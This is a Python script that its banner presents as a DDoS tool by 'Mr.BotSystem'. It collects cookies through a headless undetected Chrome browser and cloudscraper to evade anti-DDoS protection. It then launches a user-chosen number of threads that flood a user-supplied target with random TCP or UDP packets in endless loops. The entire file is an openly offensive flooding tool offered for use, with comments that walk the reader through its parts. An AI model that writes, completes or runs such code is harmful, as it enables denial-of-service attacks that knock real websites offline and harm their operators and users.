import sys
import socket
import threading
import os
import random
import urllib.parse # To parse the url and get the host and port
import requests
from threading import Thread # To use threading
import queue # To use queue
import string # To generate random payload
import undetected_chromedriver as uc # To use undetected-chromedriver
from fake_useragent import UserAgent
import cloudscraper

print("##############################################")
print("##  THIS DDOS TOOL CREATED BY Mr.BotSystem  ##")
print("##############################################")
print()
def bypass_anti_ddos(url):
    """
    Opens the given URL in a headless Chrome browser using undetected-chromedriver and cloudscraper and returns the cookies as a dictionary.
    
    Parameters:
    url (str): The URL of the website to bypass.
        
        Returns:
    dict: A dictionary of cookies with names as keys and values as values.
    """
    # Create an options object for Chrome browser
    options = uc.ChromeOptions()
    
    # Add arguments for headless mode and window size
    options.add_argument("--headless")
    options.add_argument("--window-size=1920x1080")
    
    # Create an undetected-chromedriver object with options using a context manager
    with uc.Chrome(options=options) as driver:
        
        # Get target URL using driver
        driver.get(url)

        # Wait for page load
        driver.execute_script("return document.readyState") == "complete"

        # Get cookies from driver
        cookies = driver.get_cookies() # This line should be indented to match the rest of the code
        
        # Convert cookies into requests format
        requests_cookies = {} # You need to initialize an empty dictionary to store the cookies

        for cookie in cookies: # You need to iterate over the list of cookies returned by the driver
    
            requests_cookies[cookie["name"]] = cookie["value"] # You need to assign the cookie name and value as key-value pairs in the dictionary
            
            # Create a cloudscraper session object with requests_cookies
        scraper = cloudscraper.create_scraper(cookies=requests_cookies)

        # Make a GET request using the scraper object to the same URL
        response = scraper.get(url)

        # Print the response status code and content
        print(response.status_code)
        print(response.content)
        
        # Return the requests_cookies dictionary
        return requests_cookies

# Define a list of fake user agents
ua = UserAgent()

# Define the target URL
url = input("Enter the target URL: ") # Change this to the target URL

# Parse the url and get the host and port
parsed_url = urllib.parse.urlparse(url)
host = parsed_url.hostname
port = parsed_url.port

# Define the number of threads to use
Threads = int(input("Enter the number of threads: ")) # Change this to the number of threads

# Define the protocol to use (TCP or UDP)
protocol = input("Enter the protocol (TCP or UDP): ") # Change this to the protocol

# Call the bypass_anti_ddos function and store the cookies in a variable
cookies = bypass_anti_ddos(url) # You need to call this function before creating threads and sockets

# Define a function to generate random payload
def generate_payload():
    """
    Generates a random string of alphanumeric characters of length between 10 and 100.

    Returns:
    str: A random string.
    """
    length = random.randint(10, 100) # Choose a random length between 10 and 100
    payload = "".join(random.choices(string.ascii_letters + string.digits, k=length)) # Generate a random string of that length using ascii letters and digits
    return payload
    
# Define a function to create and send packets using sockets
def send_packets():
    """
    Creates a socket object using the protocol specified by the user and sends packets with random payload and fake user agent headers to the target host and port.

    Parameters:
    None

    Returns:
    None
    """
    
    global host, port, protocol, cookies, ua # Use global variables for host, port, protocol, cookies and ua
    
    if protocol == "TCP": # If protocol is TCP
        
        # Create a TCP socket object using IPv4 address family and stream socket type
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the target host and port using the socket object
        s.connect((host, port))
        
        while True: # Loop indefinitely
            
            try: # Try to
                
                #Generate a random payload using generate_payload function
                payload = generate_payload()
                
                # Generate a fake user agent header using ua.random method
                headers = {"User-Agent": ua.random}
                
                # Encode the payload and headers into bytes using UTF-8 encoding
                data = (payload + "\r\n" + str(headers)).encode("utf-8")
                
                # Send the data using the socket object
                s.send(data)
                
                # Print a message indicating success
                print(f"Sent {len(data)} bytes of data to {host}:{port} using TCP")
                
            except: # If an exception occurs
                
                # Print a message indicating failure
                print(f"Failed to send data to {host}:{port} using TCP")
                
                # Break the loop
                break
                
    elif protocol == "UDP": # If protocol is UDP
        
        # Create a UDP socket object using IPv4 address family and datagram socket type
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while True: # Loop indefinitely
            
            try: # Try to
                
                # Generate a random payload using generate_payload function
                payload = generate_payload()
                
                # Generate a fake user agent header using ua.random method
                headers = {"User-Agent": ua.random}
                
                # Encode the payload and headers into bytes using UTF-8 encoding
                data = (payload + "\r\n" + str(headers)).encode("utf-8")
                
                # Send the data to the target host and port using the socket object
                s.sendto(data, (host, port))
                
                # Print a message indicating success
                print(f"Sent {len(data)} bytes of data to {host}:{port} using UDP")
                
            except: # If an exception occurs
                
                # Print a message indicating failure
                print(f"Failed to send data to {host}:{port} using UDP")
                
                # Break the loop
                break
                
    else: # If protocol is neither TCP nor UDP
        # Print a message indicating invalid protocol
        print("Invalid protocol. Please enter TCP or UDP.")
        
        # Exit the program
        sys.exit()

# Create a list of threads
threads = []

# Loop for the number of threads specified by the user
for i in range(Threads):
    
    # Create a thread object using send_packets function as the target
    t = threading.Thread(target=send_packets)
    
    # Append the thread object to the list of threads
    threads.append(t)
    
    # Start the thread
    t.start()

# Join all the threads in the list
for t in threads:
    t.join()
